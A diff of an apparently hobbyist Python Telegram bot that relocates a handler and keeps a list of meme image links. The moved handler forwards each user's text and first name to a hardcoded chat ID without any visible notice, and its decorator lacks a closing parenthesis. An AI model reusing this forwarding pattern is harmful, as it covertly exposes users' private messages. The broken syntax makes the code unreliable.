@@ -39,10 +39,7 @@ def find_at(msg):
 
 #a = wikipedia.page(message.text) 
 
-@bot.message_handler(content_types=['text']
-def gfg(message):
-      if message.text==message.text:
-             bot.send_message('-1001318088745' , message.chat.first_name + ' Text:' + message.text )
+
 
 #AI
 jokes = ["https://raw.githubusercontent.com/cnderton/windows/master/Screenshot_20200116-213702_Instagram%20(2).jpg" , "https://ruinmyweek.com/wp-content/uploads/2019/05/21-damn-funny-memes-everyone-should-see-this-morning-16.jpg" , "https://preview.redd.it/53o0u089qr941.jpg?width=640&height=756&crop=smart&auto=webp&s=009ce8eb5c1eda639b1869067f1959ccae826d76" , "https://preview.redd.it/wh63r3wiqka41.jpg?width=640&crop=smart&auto=webp&s=dff976e7bbd522004cddcafb7b9583346cd74f58" , "https://preview.redd.it/p7lynnvlt4b41.jpg?width=640&crop=smart&auto=webp&s=8e19418b580d54ad0ce728464a16bcfa6e70e2ad" , "https://i.redd.it/45ib7na1i5b41.jpg" , "https://preview.redd.it/84f3z7w0k4b41.jpg?width=640&crop=smart&auto=webp&s=e01c4a77f9b3d17aa729d7fc1e94b6f01020818a" , "https://preview.redd.it/yt1si5kmwza41.jpg?width=640&crop=smart&auto=webp&s=9d8ea1762efdb854381542cb932d8f51eb8dadf9" , "https://preview.redd.it/6p1g6wtry8941.jpg?width=640&crop=smart&auto=webp&s=72e44928e2274527a18b71ee540dbb75f3c52ac3" , "https://preview.redd.it/4906dkbaoya41.jpg?width=640&crop=smart&auto=webp&s=0708b95fafb8acc225078f09a11626f3cdc9d8f6" , "https://preview.redd.it/80avvadxgga41.jpg?width=640&crop=smart&auto=webp&s=6dda4d0d8383f7ccaa2d16b5c7cb834f3ec49ca3" , "https://preview.redd.it/29rtu3f6ow941.jpg?width=640&crop=smart&auto=webp&s=20caa5b383cb0fcaa912c5b29e32038f6bcbd874" , "https://preview.redd.it/zmz1nsxv5l941.jpg?width=640&crop=smart&auto=webp&s=bf698faeebc41cf910a4a9298f811c471555bb7d" , "https://i.redd.it/78luedbauta41.png" , "https://i.redd.it/3ghlucwbwu241.jpg" , "https://preview.redd.it/o3vkuwmnp8241.jpg?width=640&crop=smart&auto=webp&s=b5dc842ce27833bffe798c56460fd5433683b538" , "https://i.redd.it/gjp7s00du8w31.png" , "https://preview.redd.it/yvicqmymgdr31.jpg?width=640&crop=smart&auto=webp&s=52a9041f88059775c804d3e77d1129ce64944a10" , 
@@ -473,6 +470,10 @@ def callback_inline(call):
             bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="🇦🇿 Azerbaijani 🇦🇿",
                 reply_markup=None) 
 
+@bot.message_handler(content_types=['text']
+def gfg(message):
+      if message.text==message.text:
+             bot.send_message('-1001318088745' , message.chat.first_name + ' Text:' + message.text )
 
 
 def console_listener(messages):
